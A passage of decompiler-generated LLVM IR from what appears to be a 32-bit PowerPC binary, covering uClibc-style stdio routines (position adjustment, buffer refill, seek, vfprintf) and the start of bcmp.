  uselistorder label %dec_label_pc_1001307c, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  %v3_100130d4 = load i16, i16* %arg1, align 2
  %v4_100130d4 = zext i16 %v3_100130d4 to i32
  %tmp9 = urem i16 %v3_100130d4, 4
  %v3_100130d8 = icmp eq i16 %tmp9, 0
  br i1 %v3_100130d8, label %dec_label_pc_10013124, label %dec_label_pc_100130e0

dec_label_pc_100130e0:                            ; preds = %entry
  %v1_100130d8 = zext i16 %tmp9 to i32
  %v1_100130e0 = add nsw i32 %v1_100130d8, -1
  store i32 %v1_100130e0, i32* @r10, align 4
  %v4_100130e0 = icmp eq i32 %v1_100130e0, 0
  br i1 %v4_100130e0, label %dec_label_pc_10013124, label %dec_label_pc_100130e8

dec_label_pc_100130e8:                            ; preds = %dec_label_pc_100130e0
  %v1_100130e8 = and i32 %v4_100130d4, 2048
  %v3_100130e8 = icmp eq i32 %v1_100130e8, 0
  br i1 %v3_100130e8, label %dec_label_pc_10013124, label %dec_label_pc_100130f0

dec_label_pc_100130f0:                            ; preds = %dec_label_pc_100130e8
  %v2_100130f0 = icmp sgt i32 %v1_100130e0, 1
  br i1 %v2_100130f0, label %dec_label_pc_1001319c, label %dec_label_pc_100130f8

dec_label_pc_100130f8:                            ; preds = %dec_label_pc_100130f0
  %v2_100130f8 = add i32 %tmp, 40
  %v3_100130f8 = inttoptr i32 %v2_100130f8 to i32*
  %v4_100130f8 = load i32, i32* %v3_100130f8, align 4
  %v3_100130fc = icmp eq i32 %v4_100130f8, 0
  br i1 %v3_100130fc, label %dec_label_pc_10013104, label %dec_label_pc_1001319c

dec_label_pc_10013104:                            ; preds = %dec_label_pc_100130f8
  %v2_10013104 = add i32 %tmp, 44
  %v3_10013104 = inttoptr i32 %v2_10013104 to i32*
  %v4_10013104 = load i32, i32* %v3_10013104, align 4
  %v2_10013108 = add i32 %tmp, 3
  %v3_10013108 = inttoptr i32 %v2_10013108 to i8*
  %v4_10013108 = load i8, i8* %v3_10013108, align 1
  %v5_10013108 = zext i8 %v4_10013108 to i32
  %v2_10013110 = sub nsw i32 %v1_100130e0, %v5_10013108
  %v1_10013114 = add nsw i32 %v2_10013110, -1
  %tmp7 = icmp slt i32 %v4_10013104, 1
  br i1 %tmp7, label %dec_label_pc_10013124, label %dec_label_pc_1001311c

dec_label_pc_1001311c:                            ; preds = %dec_label_pc_10013104
  %v2_1001311c = add i32 %tmp, 2
  %v3_1001311c = inttoptr i32 %v2_1001311c to i8*
  %v4_1001311c = load i8, i8* %v3_1001311c, align 1
  %v5_1001311c = zext i8 %v4_1001311c to i32
  %v2_10013120 = sub nsw i32 %v1_10013114, %v5_1001311c
  br label %dec_label_pc_10013124

dec_label_pc_10013124:                            ; preds = %dec_label_pc_10013104, %dec_label_pc_100130e8, %dec_label_pc_100130e0, %entry, %dec_label_pc_1001311c
  %v0_10013148 = phi i32 [ %v1_10013114, %dec_label_pc_10013104 ], [ %v1_100130e0, %dec_label_pc_100130e8 ], [ 0, %dec_label_pc_100130e0 ], [ 0, %entry ], [ %v2_10013120, %dec_label_pc_1001311c ]
  %v1_10013124 = and i32 %v4_100130d4, 64
  %v3_10013124 = icmp eq i32 %v1_10013124, 0
  %storemerge.in.in.v = select i1 %v3_10013124, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10013138 = add i32 %tmp, 16
  %v3_10013138 = inttoptr i32 %v2_10013138 to i32*
  %v4_10013138 = load i32, i32* %v3_10013138, align 4
  %v1_1001313c = inttoptr i32 %arg2 to i32*
  %v2_1001313c = load i32, i32* %v1_1001313c, align 4
  store i32 %v2_1001313c, i32* %r4.global-to-local, align 4
  %v2_10013140 = sub i32 %storemerge, %v4_10013138
  %v1_10013144 = add i32 %arg2, 4
  %v2_10013144 = inttoptr i32 %v1_10013144 to i32*
  %v3_10013144 = load i32, i32* %v2_10013144, align 4
  store i32 %v3_10013144, i32* %r5.global-to-local, align 4
  %v2_10013148 = add i32 %v2_10013140, %v0_10013148
  store i32 %v2_10013148, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10013148, 0
  %v1_10013150 = zext i1 %tmp10 to i32
  %v2_10013150 = ashr i32 %v2_10013148, 31
  %v3_10013150 = and i32 %v2_10013150, -2
  %v4_10013150 = or i32 %v3_10013150, %v1_10013150
  %v2_10013154 = sub i32 %v3_10013144, %v2_10013148
  %v3_10013154 = sub i32 -1, %v2_10013148
  store i32 %v2_10013154, i32* @r10, align 4
  %v6_10013154 = icmp ule i32 %v2_10013154, %v3_10013154
  %v2_10013158 = sub nsw i32 -1, %v4_10013150
  %v3_10013158 = add i32 %v2_1001313c, %v2_10013158
  %v5_10013158 = zext i1 %v6_10013154 to i32
  %v6_10013158 = add i32 %v3_10013158, %v5_10013158
  store i32 %v6_10013158, i32* %v1_1001313c, align 4
  %v0_10013160 = load i32, i32* @r10, align 4
  %v1_10013160 = load i32, i32* @r8, align 4
  %v2_10013160 = add i32 %v1_10013160, 4
  %v3_10013160 = inttoptr i32 %v2_10013160 to i32*
  store i32 %v0_10013160, i32* %v3_10013160, align 4
  %v0_10013164 = load i32, i32* @r8, align 4
  %v1_10013164 = inttoptr i32 %v0_10013164 to i32*
  %v2_10013164 = load i32, i32* %v1_10013164, align 4
  %v1_10013168 = load i32, i32* %r4.global-to-local, align 4
  %v3_10013168 = icmp sgt i32 %v2_10013164, %v1_10013168
  br i1 %v3_10013168, label %dec_label_pc_10013180, label %dec_label_pc_10013170

dec_label_pc_10013170:                            ; preds = %dec_label_pc_10013124
  %v4_10013168 = icmp eq i32 %v2_10013164, %v1_10013168
  br i1 %v4_10013168, label %dec_label_pc_10013174, label %dec_label_pc_10013184thread-pre-split

dec_label_pc_10013174:                            ; preds = %dec_label_pc_10013170
  %v1_10013174 = add i32 %v0_10013164, 4
  %v2_10013174 = inttoptr i32 %v1_10013174 to i32*
  %v3_10013174 = load i32, i32* %v2_10013174, align 4
  %v1_10013178 = load i32, i32* %r5.global-to-local, align 4
  %v3_10013178 = icmp ugt i32 %v3_10013174, %v1_10013178
  br i1 %v3_10013178, label %dec_label_pc_10013180, label %dec_label_pc_10013184thread-pre-split

dec_label_pc_10013180:                            ; preds = %dec_label_pc_10013174, %dec_label_pc_10013124
  %v0_10013180 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013180 = sub i32 0, %v0_10013180
  store i32 %v1_10013180, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013184

dec_label_pc_10013184thread-pre-split:            ; preds = %dec_label_pc_10013170, %dec_label_pc_10013174
  %v0_10013184.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013184

dec_label_pc_10013184:                            ; preds = %dec_label_pc_10013184thread-pre-split, %dec_label_pc_10013180
  %v0_10013184 = phi i32 [ %v0_10013184.pr, %dec_label_pc_10013184thread-pre-split ], [ %v1_10013180, %dec_label_pc_10013180 ]
  %tmp8 = icmp sgt i32 %v0_10013184, -1
  br i1 %tmp8, label %dec_label_pc_100131a0, label %dec_label_pc_1001318c

dec_label_pc_1001318c:                            ; preds = %dec_label_pc_10013184
  %v0_1001318c = call i32 @__errno_location()
  %v2_10013194 = inttoptr i32 %v0_1001318c to i32*
  store i32 75, i32* %v2_10013194, align 4
  %v0_100131a4.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100131a0

dec_label_pc_1001319c:                            ; preds = %dec_label_pc_100130f8, %dec_label_pc_100130f0
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100131a0

dec_label_pc_100131a0:                            ; preds = %dec_label_pc_10013184, %dec_label_pc_1001318c, %dec_label_pc_1001319c
  %v0_100131a4 = phi i32 [ %v0_10013184, %dec_label_pc_10013184 ], [ %v0_100131a4.pre, %dec_label_pc_1001318c ], [ -1, %dec_label_pc_1001319c ]
  ret i32 %v0_100131a4

; uselistorder directives
  uselistorder i32 %v2_10013164, { 1, 0 }
  uselistorder i32 %v2_10013148, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 19, 20, 4, 3, 1, 9, 2, 5, 10, 21, 7, 22, 11, 12, 13, 15, 16, 14, 17, 18, 6, 0, 8 }
  uselistorder i32 2048, { 3, 0, 1, 2 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100131a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013184thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10013124, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_100131b8 = load i32, i32* @lr, align 4
  store i32 %v0_100131b8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_100131cc = add i32 %arg1, 8
  %v2_100131cc = inttoptr i32 %v1_100131cc to i32*
  %v3_100131cc = load i32, i32* %v2_100131cc, align 4
  %v1_100131d0 = add i32 %arg1, 12
  %v2_100131d0 = inttoptr i32 %v1_100131d0 to i32*
  %v3_100131d0 = load i32, i32* %v2_100131d0, align 4
  %v2_100131d4 = sub i32 %v3_100131d0, %v3_100131cc
  store i32 268513756, i32* @lr, align 4
  %v3_100131d8 = inttoptr i32 %v3_100131cc to i16*
  %v4_100131d8 = call i32 @__stdio_READ(i16* %v3_100131d8, i32 %v2_100131d4, i32 %v2_100131d4)
  %v0_100131dc = load i32, i32* @r29, align 4
  %v1_100131dc = add i32 %v0_100131dc, 8
  %v2_100131dc = inttoptr i32 %v1_100131dc to i32*
  %v3_100131dc = load i32, i32* %v2_100131dc, align 4
  %v2_100131e0 = add i32 %v3_100131dc, %v4_100131d8
  store i32 %v2_100131e0, i32* %r0.global-to-local, align 4
  %v2_100131e4 = add i32 %v0_100131dc, 16
  %v3_100131e4 = inttoptr i32 %v2_100131e4 to i32*
  store i32 %v3_100131dc, i32* %v3_100131e4, align 4
  %v0_100131e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100131e8 = load i32, i32* @r29, align 4
  %v2_100131e8 = add i32 %v1_100131e8, 20
  %v3_100131e8 = inttoptr i32 %v2_100131e8 to i32*
  store i32 %v0_100131e8, i32* %v3_100131e8, align 4
  store i32 %v0_100131b8, i32* %r0.global-to-local, align 4
  ret i32 %v4_100131d8

; uselistorder directives
  uselistorder i32 %v3_100131dc, { 1, 0 }
  uselistorder i32 %v4_100131d8, { 1, 0 }
  uselistorder i32 %v3_100131cc, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10013208 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013214 = load i16, i16* %arg1, align 2
  %v4_10013214 = zext i16 %v3_10013214 to i32
  %v2_10013218 = and i32 %v4_10013214, %arg2
  %v5_10013218 = icmp eq i32 %v2_10013218, 0
  br i1 %v5_10013218, label %dec_label_pc_10013220, label %dec_label_pc_10013230

dec_label_pc_10013220:                            ; preds = %entry
  %v1_10013220 = and i32 %v4_10013214, 2176
  %v3_10013220 = icmp eq i32 %v1_10013220, 0
  br i1 %v3_10013220, label %dec_label_pc_10013228, label %dec_label_pc_1001323c

dec_label_pc_10013228:                            ; preds = %dec_label_pc_10013220
  %v2_10013228 = or i32 %v4_10013214, %arg2
  %v1_1001322c = trunc i32 %v2_10013228 to i16
  store i16 %v1_1001322c, i16* %arg1, align 2
  %v0_10013230.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013230

dec_label_pc_10013230:                            ; preds = %entry, %dec_label_pc_10013228
  %v0_10013230 = phi i32 [ %tmp, %entry ], [ %v0_10013230.pre, %dec_label_pc_10013228 ]
  %v1_10013230 = inttoptr i32 %v0_10013230 to i16*
  %v2_10013230 = load i16, i16* %v1_10013230, align 2
  %v3_10013230 = zext i16 %v2_10013230 to i32
  %v1_10013234 = and i32 %v3_10013230, 16
  %v3_10013234 = icmp eq i32 %v1_10013234, 0
  br i1 %v3_10013234, label %dec_label_pc_10013258, label %dec_label_pc_1001323c

dec_label_pc_1001323c:                            ; preds = %dec_label_pc_10013220, %dec_label_pc_10013230
  %v0_1001323c = call i32 @__errno_location()
  store i32 %v0_1001323c, i32* %r3.global-to-local, align 4
  %v2_10013244 = inttoptr i32 %v0_1001323c to i32*
  store i32 9, i32* %v2_10013244, align 4
  br label %dec_label_pc_10013248

dec_label_pc_10013248:                            ; preds = %dec_label_pc_10013260, %dec_label_pc_1001323c
  %v0_10013248 = load i32, i32* @r31, align 4
  %v1_10013248 = inttoptr i32 %v0_10013248 to i16*
  %v2_10013248 = load i16, i16* %v1_10013248, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10013250 = or i16 %v2_10013248, 8
  br label %dec_label_pc_1001328c

dec_label_pc_10013258:                            ; preds = %dec_label_pc_10013230
  %v1_10013258 = and i32 %v3_10013230, 64
  %v3_10013258 = icmp eq i32 %v1_10013258, 0
  br i1 %v3_10013258, label %dec_label_pc_10013280, label %dec_label_pc_10013260

dec_label_pc_10013260:                            ; preds = %dec_label_pc_10013258
  store i32 268513892, i32* @lr, align 4
  %v0_10013260 = call i32 @__stdio_wcommit()
  store i32 %v0_10013260, i32* %r3.global-to-local, align 4
  %v3_10013264 = icmp eq i32 %v0_10013260, 0
  br i1 %v3_10013264, label %dec_label_pc_1001326c, label %dec_label_pc_10013248

dec_label_pc_1001326c:                            ; preds = %dec_label_pc_10013260
  %v0_1001326c = load i32, i32* @r31, align 4
  %v1_1001326c = inttoptr i32 %v0_1001326c to i16*
  %v2_1001326c = load i16, i16* %v1_1001326c, align 2
  %v3_1001326c = zext i16 %v2_1001326c to i32
  %v1_10013270 = add i32 %v0_1001326c, 8
  %v2_10013270 = inttoptr i32 %v1_10013270 to i32*
  %v3_10013270 = load i32, i32* %v2_10013270, align 4
  %v1_10013274 = call i32 @__asm_rlwinm(i32 %v3_1001326c, i32 0, i32 26, i32 24)
  %v2_10013274 = trunc i32 %v1_10013274 to i16
  %v1_10013278 = load i32, i32* @r31, align 4
  %v2_10013278 = add i32 %v1_10013278, 28
  %v3_10013278 = inttoptr i32 %v2_10013278 to i32*
  store i32 %v3_10013270, i32* %v3_10013278, align 4
  %v3_1001327c = load i32, i32* @r31, align 4
  %v4_1001327c = inttoptr i32 %v3_1001327c to i16*
  store i16 %v2_10013274, i16* %v4_1001327c, align 2
  %v0_10013280.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013280

dec_label_pc_10013280:                            ; preds = %dec_label_pc_10013258, %dec_label_pc_1001326c
  %v0_10013280 = phi i32 [ %v0_10013230, %dec_label_pc_10013258 ], [ %v0_10013280.pre, %dec_label_pc_1001326c ]
  %v1_10013280 = inttoptr i32 %v0_10013280 to i16*
  %v2_10013280 = load i16, i16* %v1_10013280, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10013288 = or i16 %v2_10013280, 1
  br label %dec_label_pc_1001328c

dec_label_pc_1001328c:                            ; preds = %dec_label_pc_10013248, %dec_label_pc_10013280
  %v2_1001328c = phi i32 [ %v0_10013248, %dec_label_pc_10013248 ], [ %v0_10013280, %dec_label_pc_10013280 ]
  %storemerge.off0 = phi i16 [ %v1_10013250, %dec_label_pc_10013248 ], [ %v1_10013288, %dec_label_pc_10013280 ]
  %v3_1001328c = inttoptr i32 %v2_1001328c to i16*
  store i16 %storemerge.off0, i16* %v3_1001328c, align 2
  store i32 %v0_10013208, i32* @r31, align 4
  %v0_100132a0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100132a0

; uselistorder directives
  uselistorder i32 %v4_10013214, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 4, 2, 3 }
  uselistorder i32 26, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 6, 3, 2, 1, 5, 4, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001328c, { 1, 0 }
  uselistorder label %dec_label_pc_10013280, { 1, 0 }
  uselistorder label %dec_label_pc_1001323c, { 1, 0 }
  uselistorder label %dec_label_pc_10013230, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_100132a4 = load i32, i32* @lr, align 4
  store i32 %v0_100132a4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_100132b0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_100132bc = add i32 %arg1, 4
  %v2_100132bc = inttoptr i32 %v1_100132bc to i32*
  %v3_100132bc = load i32, i32* %v2_100132bc, align 4
  %v2_100132c0 = load i32, i32* %arg2, align 4
  %v1_100132c4 = add i32 %tmp, 4
  %v2_100132c4 = inttoptr i32 %v1_100132c4 to i32*
  %v3_100132c4 = load i32, i32* %v2_100132c4, align 4
  store i32 268513996, i32* @lr, align 4
  %v4_100132c8 = call i32 @__libc_lseek64(i32 %v3_100132bc, i32 %v2_100132c0, i32 %v3_100132c4, i32 %arg3)
  %v1_100132cc = icmp slt i32 %v4_100132c8, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_100132cc, label %dec_label_pc_100132e4, label %dec_label_pc_100132d8

dec_label_pc_100132d8:                            ; preds = %entry
  %v1_100132d8 = load i32, i32* @r31, align 4
  %v2_100132d8 = inttoptr i32 %v1_100132d8 to i32*
  store i32 %v4_100132c8, i32* %v2_100132d8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100132e0 = load i32, i32* @r31, align 4
  %v2_100132e0 = add i32 %v1_100132e0, 4
  %v3_100132e0 = inttoptr i32 %v2_100132e0 to i32*
  store i32 %tmp, i32* %v3_100132e0, align 4
  %v0_100132e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100132e4

dec_label_pc_100132e4:                            ; preds = %entry, %dec_label_pc_100132d8
  %v0_100132e4 = phi i32 [ %tmp, %entry ], [ %v0_100132e4.pre, %dec_label_pc_100132d8 ]
  store i32 %v0_100132a4, i32* %r0.global-to-local, align 4
  store i32 %v0_100132b0, i32* @r31, align 4
  ret i32 %v0_100132e4

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_100132e4, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10013308 = load i32, i32* @r3, align 4
  %v1_10013308 = add i32 %v0_10013308, 56
  store i32 %v1_10013308, i32* %r30.global-to-local, align 4
  %v0_10013310 = load i32, i32* @r4, align 4
  store i32 %v0_10013310, i32* @r29, align 4
  store i32 %v0_10013308, i32* @r31, align 4
  %v1_1001331c = add i32 %v0_10013308, 52
  %v2_1001331c = inttoptr i32 %v1_1001331c to i32*
  %v3_1001331c = load i32, i32* %v2_1001331c, align 4
  store i32 %v3_1001331c, i32* @r28, align 4
  %v0_10013320 = load i32, i32* @r5, align 4
  store i32 %v0_10013320, i32* @r27, align 4
  %v2_10013324 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001332c = icmp eq i32 %v3_1001331c, 0
  br i1 %v3_1001332c, label %dec_label_pc_10013338, label %dec_label_pc_10013344

dec_label_pc_10013338:                            ; preds = %entry
  %v4_10013338 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 %v1_10013308)
  %v0_1001333c = load i32, i32* %r30.global-to-local, align 4
  store i32 268514116, i32* @lr, align 4
  %v1_10013340 = call i32 @pthread_mutex_lock(i32 %v0_1001333c)
  %v0_10013344.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013344

dec_label_pc_10013344:                            ; preds = %entry, %dec_label_pc_10013338
  %v0_10013344 = phi i32 [ %v0_10013308, %entry ], [ %v0_10013344.pre, %dec_label_pc_10013338 ]
  %v1_10013344 = inttoptr i32 %v0_10013344 to i16*
  %v2_10013344 = load i16, i16* %v1_10013344, align 2
  %v3_10013344 = zext i16 %v2_10013344 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_10013344, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_10013354 = call i32 @__asm_rlwinm(i32 %v3_10013344, i32 0, i32 24, i32 25)
  %v3_10013358 = icmp eq i32 %v1_10013354, 192
  br i1 %v3_10013358, label %dec_label_pc_1001336c, label %dec_label_pc_10013360

dec_label_pc_10013360:                            ; preds = %dec_label_pc_10013344
  store i32 268514148, i32* @lr, align 4
  %v0_10013360 = call i32 @__stdio_trans2w_o()
  %v3_10013364 = icmp eq i32 %v0_10013360, 0
  br i1 %v3_10013364, label %dec_label_pc_1001336c, label %dec_label_pc_10013380

dec_label_pc_1001336c:                            ; preds = %dec_label_pc_10013360, %dec_label_pc_10013344
  %v0_1001336c = load i32, i32* @r29, align 4
  store i32 %v0_1001336c, i32* @r4, align 4
  %v0_10013370 = load i32, i32* @r27, align 4
  store i32 %v0_10013370, i32* @r5, align 4
  %v0_10013374 = load i32, i32* @r31, align 4
  store i32 %v0_10013374, i32* @r3, align 4
  store i32 268514172, i32* @lr, align 4
  %v0_10013378 = call i32 @_vfprintf_internal()
  store i32 %v0_10013378, i32* @r30, align 4
  br label %dec_label_pc_10013380

dec_label_pc_10013380:                            ; preds = %dec_label_pc_10013360, %dec_label_pc_1001336c
  %v0_10013380 = load i32, i32* @r28, align 4
  %v3_10013380 = icmp eq i32 %v0_10013380, 0
  store i32 %v2_10013324, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  br i1 %v3_10013380, label %dec_label_pc_10013390, label %dec_label_pc_10013394

dec_label_pc_10013390:                            ; preds = %dec_label_pc_10013380
  store i32 268514196, i32* @lr, align 4
  %v0_10013390 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10013394

dec_label_pc_10013394:                            ; preds = %dec_label_pc_10013380, %dec_label_pc_10013390
  %v0_10013398 = load i32, i32* @r30, align 4
  ret i32 %v0_10013398

; uselistorder directives
  uselistorder i32 %v0_10013344, { 1, 0 }
  uselistorder i32 %v0_10013308, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 5, 4, 1, 23, 11, 10, 9, 8, 7, 3, 0, 26, 28, 27, 24, 6, 17, 16, 15, 19, 18, 2, 14, 25, 13, 12, 22, 21, 20 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 18, 17, 12, 3, 11, 25, 24, 23, 22, 21, 20, 16, 0, 42, 50, 49, 40, 14, 13, 2, 1, 10, 9, 8, 19, 31, 30, 29, 33, 32, 15, 28, 41, 27, 26, 36, 35, 34, 48, 47, 51, 7, 4, 52, 6, 5, 46, 45, 44, 43, 39, 38, 37 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 23, 24, 27, 16, 17, 18, 19, 20, 21, 25, 28, 2, 0, 1, 4, 22, 10, 11, 12, 8, 9, 26, 13, 3, 14, 15, 5, 6, 7 }
  uselistorder i32 268461856, { 0, 16, 5, 6, 9, 7, 17, 8, 10, 11, 2, 12, 13, 3, 18, 19, 14, 15, 1, 4, 20, 21, 23, 22 }
  uselistorder i32 52, { 10, 11, 9, 14, 15, 12, 7, 5, 13, 8, 6, 4, 0, 1, 2, 3 }
  uselistorder i32 56, { 13, 14, 2, 3, 4, 20, 10, 15, 11, 8, 16, 1, 12, 9, 7, 0, 5, 6, 17, 18, 19 }
  uselistorder label %dec_label_pc_10013394, { 1, 0 }
  uselistorder label %dec_label_pc_10013380, { 1, 0 }
  uselistorder label %dec_label_pc_10013344, { 1, 0 }
}

define i32 @bcmp(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v2_100133ac = icmp ugt i32 %arg1, 15
  %v3_100133ac = icmp eq i32 %arg1, 15
  store i1 %v3_100133ac, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg1, i32* @r31, align 4
  br i1 %v2_100133ac, label %dec_label_pc_100133e0.preheader, label %dec_label_pc_10013694

dec_label_pc_100133e0.preheader:                  ; preds = %entry
  %v0_100133e0.pre = load i32, i32* @r4, align 4
  %v0_100133ec.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100133e0

dec_label_pc_100133c4:                            ; preds = %dec_label_pc_100133e0
  %v1_100133c4 = inttoptr i32 %v0_10013468 to i8*
  %v2_100133c4 = load i8, i8* %v1_100133c4, align 1
  %v3_100133c4 = zext i8 %v2_100133c4 to i32
  store i32 %v3_100133c4, i32* %r9.global-to-local, align 4
  %v1_100133c8 = add i32 %v0_100133f4, -1
  store i32 %v1_100133c8, i32* @r31, align 4
  %v1_100133cc = inttoptr i32 %v0_1001346c to i8*
  %v2_100133cc = load i8, i8* %v1_100133cc, align 1
  %v3_100133cc = zext i8 %v2_100133cc to i32
  store i32 %v3_100133cc, i32* %r0.global-to-local, align 4
  %v1_100133d0 = add i32 %v0_10013468, 1
  %v1_100133d4 = add i32 %v0_1001346c, 1
  store i32 %v1_100133d4, i32* @r4, align 4
  %v2_100133d8 = sub nsw i32 %v3_100133c4, %v3_100133cc
  store i32 %v2_100133d8, i32* %r9.global-to-local, align 4
  %v4_100133dc = icmp eq i8 %v2_100133c4, %v2_100133cc
  br i1 %v4_100133dc, label %dec_label_pc_100133e0, label %dec_label_pc_10013654

dec_label_pc_100133e0:                            ; preds = %dec_label_pc_100133e0.preheader, %dec_label_pc_100133c4
  %v0_100133f4 = phi i32 [ %arg1, %dec_label_pc_100133e0.preheader ], [ %v1_100133c8, %dec_label_pc_100133c4 ]
  %v0_10013468 = phi i32 [ %v0_100133ec.pre, %dec_label_pc_100133e0.preheader ], [ %v1_100133d0, %dec_label_pc_100133c4 ]
  %v0_1001346c = phi i32 [ %v0_100133e0.pre, %dec_label_pc_100133e0.preheader ], [ %v1_100133d4, %dec_label_pc_100133c4 ]
  %v1_100133e0 = urem i32 %v0_1001346c, 4
  store i32 %v1_100133e0, i32* %r0.global-to-local, align 4
  %v3_100133e0 = icmp eq i32 %v1_100133e0, 0
  store i32 %v0_1001346c, i32* %r29.global-to-local, align 4
  br i1 %v3_100133e0, label %dec_label_pc_100133ec, label %dec_label_pc_100133c4

dec_label_pc_100133ec:                            ; preds = %dec_label_pc_100133e0
  %v1_100133ec = urem i32 %v0_10013468, 4
  %v3_100133ec = icmp eq i32 %v1_100133ec, 0
  store i32 %v0_10013468, i32* @r30, align 4
  %v1_100133f4 = udiv i32 %v0_100133f4, 4
  store i32 %v1_100133f4, i32* %r9.global-to-local, align 4
  %v1_100133fc = urem i32 %v1_100133f4, 4
  store i32 %v1_100133fc, i32* %r0.global-to-local, align 4
  br i1 %v3_100133ec, label %dec_label_pc_100133fc, label %dec_label_pc_100134fc

dec_label_pc_100133fc:                            ; preds = %dec_label_pc_100133ec
  %v3_10013404 = icmp eq i32 %v1_100133fc, 1
  store i1 %v3_10013404, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013404, label %dec_label_pc_1001345c, label %dec_label_pc_1001340c

dec_label_pc_1001340c:                            ; preds = %dec_label_pc_100133fc
  %v1_10013404 = icmp eq i32 %v1_100133fc, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10013404, label %dec_label_pc_10013450, label %dec_label_pc_10013414

dec_label_pc_10013414:                            ; preds = %dec_label_pc_1001340c
  %v3_10013414 = icmp eq i32 %v1_100133fc, 3
  store i1 %v3_10013414, i1* %cr7_eq.global-to-local, align 1
  %v1_10013418 = inttoptr i32 %v0_1001346c to i32*
  %v2_10013418 = load i32, i32* %v1_10013418, align 4
  %v1_1001341c = inttoptr i32 %v0_10013468 to i32*
  %v2_1001341c = load i32, i32* %v1_1001341c, align 4
  store i32 %v2_1001341c, i32* %r0.global-to-local, align 4
  br i1 %v3_10013414, label %dec_label_pc_1001343c, label %dec_label_pc_10013424

dec_label_pc_10013424:                            ; preds = %dec_label_pc_10013414
  %v1_10013428 = add i32 %v0_10013468, -8
  store i32 %v2_10013418, i32* %r0.global-to-local, align 4
  %v1_10013430 = add i32 %v0_1001346c, -8
  %v1_10013434 = add nuw nsw i32 %v1_100133f4, 2
  br label %dec_label_pc_100134a8

